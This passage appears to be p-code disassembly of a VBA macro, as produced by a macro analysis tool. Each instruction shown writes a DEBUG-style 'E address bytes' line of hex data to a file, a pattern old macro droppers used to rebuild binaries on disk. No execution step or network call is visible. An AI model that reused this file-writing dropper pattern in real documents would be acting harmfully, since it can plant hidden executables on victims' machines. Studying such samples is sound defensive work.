' 	LitStr 0x0036 "E C070 E2 B1 C2 D5 59 6B 7C 7C 8E 9F 78 8A 9B B9 CB DC"
' 	PrintItemNL 
' Line #3274:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C080 CA DC ED 84 96 A7 70 82 93 4D 5F 70 50 62 73 55"
' 	PrintItemNL 
' Line #3275:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C090 67 78 58 6A 7B 3A 4C 5D 4E 60 71 9F B1 C2 A0 B2"
' 	PrintItemNL 
' Line #3276:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C0A0 C3 80 92 A3 A2 B4 C5 AE C0 D1 AE BE CE C0 D1 DE"
' 	PrintItemNL 
' Line #3277:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C0B0 A9 BA C7 91 A3 AE A4 B7 BF BE D1 D9 C0 D2 DD BA"
' 	PrintItemNL 
' Line #3278:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C0C0 CC D7 9D AD BD A2 B2 C2 B7 C7 D8 B5 C5 D5 B6 C6"
' 	PrintItemNL 
' Line #3279:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C0D0 D6 99 AB B6 57 69 74 53 64 6D 5C 6C 73 58 66 6C"
' 	PrintItemNL 
' Line #3280:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C0E0 57 66 69 61 71 70 66 77 74 59 6A 66 89 97 95 9F"
' 	PrintItemNL 
' Line #3281:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C0F0 AD AB A1 AF AE C6 D3 D5 E6 F0 F7 E0 EA F1 C7 CF"
' 	PrintItemNL 
' Line #3282:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C100 D6 B1 B9 C0 B6 BF C3 BA C3 C7 D1 DD DF CE DB DD"
' 	PrintItemNL 
' Line #3283:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C110 B1 BD BF 64 71 73 45 51 53 00 01 03 00 00 F3 F4"
' 	PrintItemNL 
' Line #3284:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C120 F2 F1 F2 F0 E1 E2 E0 D0 D1 CF C3 C5 C5 B4 B8 B9"
' 	PrintItemNL 
' Line #3285:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C130 00 00 04 A0 A9 B2 81 8D 99 57 67 74 72 80 92 8A"
' 	PrintItemNL 
' Line #3286:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C140 9A AB 92 A1 B1 9D AD BA 9C A7 B5 97 A3 AF BC C5"
' 	PrintItemNL 
' Line #3287:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C150 D3 A8 B1 BF B1 BC CA 94 9F AD 76 81 8F 7F 8A 98"
' 	PrintItemNL 
' Line #3288:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C160 93 9E AC 92 9D AB 8B 98 A6 9A A7 B5 96 A6 B3 8E"
' 	PrintItemNL 
' Line #3289:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C170 9E AB 94 A4 B1 A1 B1 BE B2 C2 CF C3 D3 E3 D4 E2"
' 	PrintItemNL 
' Line #3290:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C180 F8 B3 C3 DA 95 A6 BB 9E AF C2 C2 D4 E5 CC DF EE"
' 	PrintItemNL 
' Line #3291:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C190 B7 C8 D5 A2 B4 BF 8F A1 AC B5 C8 D0 C6 D7 E0 C1"
' 	PrintItemNL 
' Line #3292:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C1A0 D2 DB B3 C3 CF C1 D1 DD C7 D7 E4 CC DD EA 8B 9E"
' 	PrintItemNL 
' Line #3293:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C1B0 AB 51 64 71 95 A8 B7 EA FC FF AB BC CF 50 61 74"
' 	PrintItemNL 
' Line #3294:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C1C0 31 42 57 66 77 8C 70 81 96 4C 5D 72 5E 6F 84 7E"
' 	PrintItemNL 
' Line #3295:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C1D0 8F A4 BB CC DF 99 AA BD 56 68 79 6F 81 92 A7 B9"
' 	PrintItemNL 
' Line #3296:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C1E0 CA DB ED FE 92 A4 B5 46 58 69 43 55 66 48 5A 6B"
' 	PrintItemNL 
' Line #3297:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C1F0 40 52 63 50 62 73 59 6B 7C 55 67 78 98 AA BB AC"
' 	PrintItemNL 
' Line #3298:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C200 BE CF 96 A8 B9 A2 B4 C5 AC BE CF B9 CB DC C0 D0"
' 	PrintItemNL 
' Line #3299:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C210 E0 BE CF DC 93 A4 B1 AC BE C9 C3 D6 DE AB BE C6"
' 	PrintItemNL 
' Line #3300:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C220 AF C1 CC A4 B6 C1 9A AA BA B9 C9 D9 C2 D2 E3 C3"
' 	PrintItemNL 
' Line #3301:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C230 D3 E3 C0 D0 E0 98 AA B5 61 73 7E 42 53 5C 41 4E"
' 	PrintItemNL 
' Line #3302:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C240 56 3D 49 4D 46 53 55 4E 5C 5B 46 57 54 5A 6B 67"
' 	PrintItemNL 
' Line #3303:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C250 BA C9 C5 E4 F2 F0 D9 E7 E6 D2 DF E1 C7 D1 D8 C8"
' 	PrintItemNL 
' Line #3304:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C260 D2 D9 E8 F0 F7 F1 F9 FF DE E7 EB D0 D9 DD A7 B0"
' 	PrintItemNL 
' Line #3305:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C270 B3 A2 AE B0 A2 AB AE 64 70 72 41 4A 4D 00 01 03"
' 	PrintItemNL 
' Line #3306:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C280 00 00 FA F8 F7 F0 F1 EF DB DC DA CC CC CC C3 C5"
' 	PrintItemNL 
' Line #3307:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C290 C5 B5 B9 BA 00 00 05 A3 AC B5 96 A2 AE 78 85 93"
' 	PrintItemNL 
' Line #3308:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C2A0 79 88 98 76 85 95 70 7F 8F 8B 98 A8 9E A9 B7 9B"
' 	PrintItemNL 
' Line #3309:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C2B0 A6 B4 B0 B9 C7 B3 BC C9 B4 BF CD 77 83 8F 63 6E"
' 	PrintItemNL 
' Line #3310:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C2C0 7C 75 81 8D 8C 97 A5 7A 86 92 7A 85 93 7E 8A 96"
' 	PrintItemNL 
' Line #3311:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C2D0 93 A0 AE 8F 9D A9 8F 9C AA B4 C4 D0 BA CA D7 95"
' 	PrintItemNL 
' Line #3312:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C2E0 A5 B5 CA D9 EC CA D8 EE B5 C3 D9 8D 9C AF 88 98"
' 	PrintItemNL 
' Line #3313:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C2F0 A9 B3 C3 D3 CB DC E9 B8 C9 D6 9C AC B8 92 A2 AE"
' 	PrintItemNL 
' Line #3314:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C300 95 A5 B1 B7 C7 D3 BD CD DA C1 D1 DE AC BB CB BA"
' 	PrintItemNL 
' Line #3315:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C310 CA DA BF CF DF 98 AB BA 61 74 83 A4 B6 C7 DC ED"
' 	PrintItemNL 
' Line #3316:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C320 FF A4 B5 C8 3A 4B 60 24 35 4A 44 55 6A 36 47 5C"
' 	PrintItemNL 
' Line #3317:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C330 43 54 69 78 89 9E 9B AC C1 86 97 AA 61 72 85 78"
' 	PrintItemNL 
' Line #3318:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C340 89 9C A9 BA CD 97 A8 BB 4B 5C 6F 34 46 57 3B 4D"
' 	PrintItemNL 
' Line #3319:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C350 5E 46 58 69 5F 71 82 61 73 84 55 67 78 98 AA BB"
' 	PrintItemNL 
' Line #3320:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C360 C2 D4 E5 A7 B9 CA 9A AB BE B6 C7 DA C2 D3 E6 C0"
' 	PrintItemNL 
' Line #3321:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C370 D1 E4 C4 D7 E6 8C 9F AC 92 A4 AF B0 C2 CD AD C0"
' 	PrintItemNL 
' Line #3322:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C380 C8 AC BF C7 AE C0 CB A6 B8 C3 AD BD CA D0 DF EF"
' 	PrintItemNL 
' Line #3323:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C390 C0 CF DF AC BC C9 83 93 9F 69 78 81 79 89 90 63"
' 	PrintItemNL 
' Line #3324:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C3A0 73 79 6D 79 7F 49 55 5B 51 5D 61 5E 6C 6B 4F 5D"
' 	PrintItemNL 
' Line #3325:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C3B0 5C 78 86 84 DF ED EB EB F9 F7 E5 F3 F2 E5 F2 F4"
' 	PrintItemNL 
' Line #3326:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C3C0 D6 E1 E5 C4 CE D5 D1 D9 E0 D8 E0 E7 D3 DC E0 E8"
' 	PrintItemNL 
' Line #3327:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C3D0 F1 F5 DA E6 E8 B8 C4 C6 B1 BA BD 6E 77 7A 4D 56"
' 	PrintItemNL 
' Line #3328:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C3E0 59 00 08 0B 00 00 FA F5 F6 EC EA EA DD DD DD D1"
' 	PrintItemNL 
' Line #3329:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C3F0 D3 D4 BD C1 C2 BC C1 C4 00 00 04 8D 96 9F 71 7D"
' 	PrintItemNL 
' Line #3330:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C400 87 73 81 8D 90 9D AB 87 94 A4 77 84 94 86 90 A1"
' 	PrintItemNL 
' Line #3331:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C410 92 9C AD A4 AE BF 8B 94 A1 9E A8 B2 9A A6 B2 63"
' 	PrintItemNL 
' Line #3332:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C420 72 7B 6E 7C 88 85 94 9D 92 9E AA 84 90 9A 89 91"
' 	PrintItemNL 
' Line #3333:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C430 9E 8F 98 A2 99 A1 AE 98 A2 AC 91 9D A9 AF BE C7"
' 	PrintItemNL 
' Line #3334:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C440 CB DD E8 B3 C5 D0 BA C9 D9 D9 E5 F7 C8 D6 E8 A7"
' 	PrintItemNL 
' Line #3335:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C450 B5 C7 91 A0 B0 9C AB BB A7 B6 C6 BE CD DD B4 C1"
' 	PrintItemNL 
' Line #3336:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C460 D1 98 A7 B7 83 92 A2 75 84 94 7F 8E 9E A7 B6 C6"
' 	PrintItemNL 
' Line #3337:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C470 B6 C4 D6 99 A9 BA 7C 8C 9D 89 9B AC 9E B0 C1 9A"
' 	PrintItemNL 
' Line #3338:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C480 AC BD B2 C3 D6 CA DB EE 93 A4 B7 58 69 7C 2A 3B"
' 	PrintItemNL 
' Line #3339:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C490 50 30 41 56 51 62 77 74 85 9A 78 89 9E 74 85 9A"
' 	PrintItemNL 
' Line #3340:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C4A0 81 92 A7 91 A2 B7 84 95 AA 60 71 86 43 54 69 3F"
' 	PrintItemNL 
' Line #3341:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C4B0 50 63 4E 5F 72 64 75 88 69 7B 8C 5B 6D 7E A6 B8"
' 	PrintItemNL 
' Line #3342:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C4C0 C9 C2 D4 E5 A7 B8 CB 94 A5 B8 B0 C1 D6 B8 C8 DF"
' 	PrintItemNL 
' Line #3343:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C4D0 B4 C4 DB BD CE E3 9A AC BD 7D 93 9F AA BE C9 B4"
' 	PrintItemNL 
' Line #3344:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C4E0 C9 D1 A6 B9 C1 AE C1 C9 A7 B7 C3 B1 C1 CD CA D8"
' 	PrintItemNL 
' Line #3345:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C4F0 E4 D9 E5 F1 B1 BD C9 84 8E 98 79 85 8B 82 8D 91"
' 	PrintItemNL 
' Line #3346:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C500 89 95 95 83 8F 8F 81 8B 92 7D 86 8F 7B 85 8C 75"
' 	PrintItemNL 
' Line #3347:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C510 80 84 6A 75 79 8F 9B 9D BF CB CB B6 C2 C2 D5 E1"
' 	PrintItemNL 
' Line #3348:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C520 E3 E1 ED EF E6 F2 F4 E2 ED F1 D6 E1 E5 DC E7 EB"
' 	PrintItemNL 
' Line #3349:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C530 E7 F0 F4 CF DA DE CA D7 D9 C3 D0 D2 B4 BD C0 9B"
' 	PrintItemNL 
' Line #3350:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C540 A2 A5 78 7F 82 02 09 0C 00 00 FB F6 F7 EC EA EA"
' 	PrintItemNL 
' Line #3351:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C550 E0 DD DF D3 D5 D6 BD C0 C4 B7 BE C1 00 01 05 A6"
' 	PrintItemNL 
' Line #3352:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C560 B0 B7 7B 86 8E 70 7C 86 78 84 90 79 86 94 83 8D"
' 	PrintItemNL 
' Line #3353:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C570 9E 8A 94 A5 81 8B 9D 95 9F B0 95 9E AB A3 AF B9"
' 	PrintItemNL 
' Line #3354:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C580 8B 9A A3 64 73 7C 71 82 8B 84 95 9E 8F 9B A5 8E"
' 	PrintItemNL 
' Line #3355:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C590 98 A2 A4 AD B7 98 9E A9 84 8A 95 97 A0 AA B2 BC"
' 	PrintItemNL 
' Line #3356:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C5A0 C6 AA B9 C2 A6 B9 C1 AF C1 CC BE CB D9 DA E4 F5"
' 	PrintItemNL 
' Line #3357:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C5B0 DB E8 F8 D7 E4 F4 BD CA DA A4 B1 C1 99 A5 B7 AF"
' 	PrintItemNL 
' Line #3358:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C5C0 BB CD BB C7 D9 B0 BE D0 A3 B1 C3 96 A4 B6 76 84"
' 	PrintItemNL 
' Line #3359:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C5D0 96 4A 58 6A 4F 5D 70 7F 8E A1 88 98 A9 7D 8F A0"
' 	PrintItemNL 
' Line #3360:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C5E0 89 99 AA 81 93 A4 7F 8E A1 83 94 A7 86 95 A8 98"
' 	PrintItemNL 
' Line #3361:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C5F0 A9 BC 70 7E 94 59 6A 7F 5E 6C 82 78 89 9E 8B 99"
' 	PrintItemNL 
' Line #3362:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C600 B0 89 99 B0 85 93 AA 7C 8C A3 6C 7A 91 48 58 6F"
' 	PrintItemNL 
' Line #3363:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C610 46 54 6A 59 6A 7F 59 68 7B 54 66 77 7F 8F A0 B3"
' 	PrintItemNL 
' Line #3364:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C620 C5 D6 BE CE DF 95 A7 B8 96 A6 B7 98 A9 BC AC BA"
' 	PrintItemNL 
' Line #3365:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C630 D0 CE DE F5 C5 D2 EC A7 B7 CE 8B 9D AE A6 BC C8"
' 	PrintItemNL 
' Line #3366:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C640 B5 CB D6 B7 CC D4 B8 CB D3 B3 C6 CE B9 C9 D5 C6"
' 	PrintItemNL 
' Line #3367:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C650 D6 E2 D2 E0 EC A4 B0 BC 76 7F 8C 75 7E 88 84 8E"
' 	PrintItemNL 
' Line #3368:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C660 95 88 91 94 83 8E 8C 7E 88 88 7C 84 8B 71 78 81"
' 	PrintItemNL 
' Line #3369:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C670 82 89 92 8D 97 9E 80 8B 8F A4 AF B3 DF EB ED E0"
' 	PrintItemNL 
' Line #3370:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C680 EC EE A5 B1 B3 AD B9 BB AE BA BC B9 C5 C7 BD C8"
' 	PrintItemNL 
' Line #3371:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C690 CC BE C9 CD D3 DC E0 E0 EB EF B3 BF C3 95 A1 A5"
' 	PrintItemNL 
' Line #3372:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C6A0 8C 95 99 88 8E 93 6D 73 78 00 00 04 00 00 FF FE"
' 	PrintItemNL 
' Line #3373:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C6B0 FD F1 EF EE E5 E3 E3 D5 D7 D7 BC C0 C1 B1 B8 BB"
' 	PrintItemNL 
' Line #3374:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C6C0 00 02 06 BC C6 CD 7B 86 8E 5E 6A 74 7B 87 93 91"
' 	PrintItemNL 
' Line #3375:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C6D0 9D A9 7C 87 95 81 8C 9A 8F 99 AA 9E A9 B7 B6 C2"
' 	PrintItemNL 
' Line #3376:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C6E0 CE AA B6 C0 78 87 90 6A 7B 84 76 87 90 8D 9E A7"
' 	PrintItemNL 
' Line #3377:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C6F0 9D A9 B3 9C A6 B0 B4 BD C7 B6 BF C9 84 8D 97 7F"
' 	PrintItemNL 
' Line #3378:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C700 89 93 AA B6 C0 92 A3 AC 67 7A 82 66 79 81 A2 B0"
' 	PrintItemNL 
' Line #3379:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C710 BC D3 DE EC DF EA F8 E1 EC FA D5 E2 F0 C9 D6 E4"
' 	PrintItemNL 
' Line #3380:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C720 AB B8 C8 94 A1 B1 A7 B5 C7 C5 D3 E5 B7 C5 D7 94"
' 	PrintItemNL 
' Line #3381:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C730 A4 B5 92 A1 B4 8B 9A AD 67 76 89 49 58 6B 43 53"
' 	PrintItemNL 
' Line #3382:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C740 64 51 61 72 68 76 89 59 68 7B 4E 5C 6F 54 63 76"
' 	PrintItemNL 
' Line #3383:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C750 5C 69 7F 6E 7C 92 86 93 A9 62 70 86 59 65 7D 76"
' 	PrintItemNL 
' Line #3384:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C760 84 9B 91 9D B5 92 A0 B7 88 94 AC 7D 8B A2 6C 78"
' 	PrintItemNL 
' Line #3385:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C770 90 64 72 89 53 60 76 45 53 69 60 6E 81 93 A3 B4"
' 	PrintItemNL 
' Line #3386:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C780 AE BC CE A2 B2 C2 81 90 A0 9E AE BE 9F AE BE AA"
' 	PrintItemNL 
' Line #3387:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C790 BA CB C3 D1 E4 CA D8 EE BD CA E0 92 A0 B6 84 97"
' 	PrintItemNL 
' Line #3388:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C7A0 A6 C7 DA E7 C1 D5 E0 B3 C7 D2 B3 C6 CE B3 C6 CE"
' 	PrintItemNL 
' Line #3389:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C7B0 D1 E1 ED D0 E0 ED 8B 98 A6 71 7C 8A 6F 7A 88 7D"
' 	PrintItemNL 
' Line #3390:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C7C0 86 93 82 8D 95 83 8E 92 7C 88 8A 73 7F 81 89 91"
' 	PrintItemNL 
' Line #3391:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C7D0 98 85 8C 95 94 9B A4 9B A3 AA 86 8F 93 93 9C A0"
' 	PrintItemNL 
' Line #3392:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C7E0 CA D3 D6 E9 F3 F3 E7 F1 F1 D9 E3 E3 D0 DA DA DD"
' 	PrintItemNL 
' Line #3393:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C7F0 E7 E7 CD D6 D9 A4 AD B0 9D A4 A7 A6 AF B3 AB B5"
' 	PrintItemNL 
' Line #3394:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C800 BC 7E 88 8F 88 90 97 9D A3 AA 8E 94 9B 00 01 08"
' 	PrintItemNL 
' Line #3395:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C810 00 00 F9 F5 F4 EB E9 E8 DF DF DF D2 D4 D4 BD C1"
' 	PrintItemNL 
' Line #3396:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C820 C2 B6 BB BC 00 07 0A D0 D9 DD 8A 94 9B 7B 86 8E"
' 	PrintItemNL 
' Line #3397:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C830 8A 94 9E 95 A1 AD 8B 97 A3 87 92 A0 91 9C AA B0"
' 	PrintItemNL 
' Line #3398:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C840 BB C9 C1 CD D9 90 9F A8 57 68 71 75 86 8F 88 99"
' 	PrintItemNL 
' Line #3399:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C850 A2 A9 BA C3 C1 CD D7 BA C6 D0 8F 99 A3 A6 AF B9"
' 	PrintItemNL 
' Line #3400:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C860 83 8C 96 77 81 8B 98 A4 AE 8A 9B A4 5F 72 7A 4E"
' 	PrintItemNL 
' Line #3401:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C870 61 69 7B 8A 93 C2 CE D8 DA E6 F2 DE EA F6 D3 DF"
' 	PrintItemNL 
' Line #3402:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C880 EB D2 DF ED C9 D6 E4 B5 C2 D2 80 8F 9F 8B 9B AC"
' 	PrintItemNL 
' Line #3403:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C890 AD BD CE C0 D0 E1 A3 B2 C5 74 85 98 62 73 86 66"
' 	PrintItemNL 
' Line #3404:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C8A0 77 8A 4A 58 6B 2F 3D 4F 2B 39 4C 2F 3D 50 35 43"
' 	PrintItemNL 
' Line #3405:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C8B0 56 39 47 5A 41 4E 64 5B 68 7E 77 84 9A 77 84 9A"
' 	PrintItemNL 
' Line #3406:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C8C0 75 81 99 78 84 9C 87 93 AB 95 A1 B9 8E 9A B2 7A"
' 	PrintItemNL 
' Line #3407:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C8D0 86 9E 53 5F 77 4D 59 71 48 55 6B 56 64 77 79 87"
' 	PrintItemNL 
' Line #3408:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C8E0 9A 97 A5 B7 90 9F AF 75 84 94 8A 99 A9 94 A3 B3"
' 	PrintItemNL 
' Line #3409:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
